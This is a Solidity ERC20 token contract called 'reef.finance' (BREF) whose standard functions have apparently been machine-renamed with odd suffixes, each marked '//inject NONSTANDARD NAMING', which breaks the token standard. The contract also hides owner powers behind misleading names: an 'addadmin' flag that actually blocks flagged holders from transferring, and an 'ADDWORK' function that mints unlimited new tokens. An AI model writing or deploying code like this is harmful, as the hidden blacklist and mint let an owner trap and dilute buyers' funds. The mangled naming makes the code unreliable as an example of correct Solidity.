                                                                 

                                                                 

                                                                 

pragma solidity ^0.5.11;

interface IERC20 {
  function TOTALSUPPLY564() external view returns (uint256);	//inject NONSTANDARD NAMING
  function BALANCEOF861(address who) external view returns (uint256);	//inject NONSTANDARD NAMING
  function ALLOWANCE414(address owner, address spender) external view returns (uint256);	//inject NONSTANDARD NAMING
  function TRANSFER480(address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function APPROVE308(address spender, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function TRANSFERFROM442(address from, address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING

  event TRANSFER10(address indexed from, address indexed to, uint256 value);	//inject NONSTANDARD NAMING
  event APPROVAL742(address indexed owner, address indexed spender, uint256 value);	//inject NONSTANDARD NAMING
}

library SafeMath {
  function MUL732(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function DIV585(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a / b;
    return c;
  }

  function SUB651(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    assert(b <= a);
    return a - b;
  }

  function ADD120(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function CEIL735(uint256 a, uint256 m) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = ADD120(a,m);
    uint256 d = SUB651(c,1);
    return MUL732(DIV585(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function NAME867() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokenname;
  }

  function SYMBOL322() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokensymbol;
  }

  function DECIMALS626() public view returns(uint8) {	//inject NONSTANDARD NAMING
    return _Tokendecimals;
  }
}



contract BREF is ERC20Detailed {

  using SafeMath for uint256;
    
  uint256 public totalBurn = 0;
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public addadmin;
  string constant tokenname95 = "reef.finance";	//inject NONSTANDARD NAMING
  string constant tokensymbol712 = "BREF";	//inject NONSTANDARD NAMING
  uint8  constant tokendecimals775 = 18;	//inject NONSTANDARD NAMING
  uint256 _totalSupply = 20000*10**uint(tokendecimals775); 
 
  
  //any tokens sent here ? 
  IERC20 currentToken ;
  	address payable public _owner;
    
    //modifiers	
	modifier ONLYOWNER60() {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner);
      _;
  }
  
  address initialSupplySend = 0x1254dfF481fd0cBd308d9586D678E0D2942a35fc;
  

  constructor() public payable ERC20Detailed(tokenname95, tokensymbol712, tokendecimals775) {
      
    _SUPPLY512(initialSupplySend, _totalSupply);
    _owner = msg.sender;
  }

  function TOTALSUPPLY564() public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _totalSupply;
  }

  function BALANCEOF861(address owner) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _balances[owner];
  }

  function ALLOWANCE414(address owner, address spender) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _allowed[owner][spender];
  }

  function ADDADMIN155(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = true;
  }
  
    function REMOVEADMIN935(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = false;
  }

 function TRANSFER480(address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        _EXECUTETRANSFER548(msg.sender, to, value);
        return true;
    }
    
    function MULTITRANSFER702(address[] memory receivers, uint256[] memory values) public	//inject NONSTANDARD NAMING
    {
        require(receivers.length == values.length);
        for(uint256 i = 0; i < receivers.length; i++)
            _EXECUTETRANSFER548(msg.sender, receivers[i], values[i]);
    }
    
    function TRANSFERFROM442(address from, address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        require(value <= _allowed[from][msg.sender]);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].SUB651(value);
        _EXECUTETRANSFER548(from, to, value);
        return true;
    }
   
    function _EXECUTETRANSFER548(address _from, address _to, uint256 _value) private	//inject NONSTANDARD NAMING
    {
      require(!addadmin[_from], "error");
        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();           // Check if the sender has enough
        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows
        _balances[_from] = SafeMath.SUB651(_balances[_from], _value);                     // Subtract from the sender
        _balances[_to] = SafeMath.ADD120(_balances[_to], _value);                            // Add the same to the recipient
        emit TRANSFER10(_from, _to, _value);                   // Notify anyone listening that this transfer took place
    }
         
  //no zeros for decimals necessary 
  function MULTITRANSFEREQUALAMOUNT821(address[] memory receivers, uint256 amount) public {	//inject NONSTANDARD NAMING
    uint256 amountWithDecimals = amount * 10**tokendecimals775;

    for (uint256 i = 0; i < receivers.length; i++) {
      TRANSFER480(receivers[i], amountWithDecimals);
    }
  }

  function APPROVE308(address spender, uint256 value) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit APPROVAL742(msg.sender, spender, value);
    return true;
  }

  function INCREASEALLOWANCE691(address spender, uint256 addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].ADD120(addedValue));
    emit APPROVAL742(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function DECREASEALLOWANCE97(address spender, uint256 subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].SUB651(subtractedValue));
    emit APPROVAL742(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _SUPPLY512(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
    require(amount != 0);
    _balances[account] = _balances[account].ADD120(amount);
    emit TRANSFER10(address(0), account, amount);
  }

 //take back unclaimed tokens of any type sent by mistake
  function WITHDRAWUNCLAIMEDTOKENS417(address contractUnclaimed) external ONLYOWNER60 {	//inject NONSTANDARD NAMING
      currentToken = IERC20(contractUnclaimed);
      uint256 amount = currentToken.BALANCEOF861(address(this));
      currentToken.TRANSFER480(_owner, amount);
  }
  
  function ADDWORK807(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!warning");
      _SUPPLY512(account, amount);
  }
}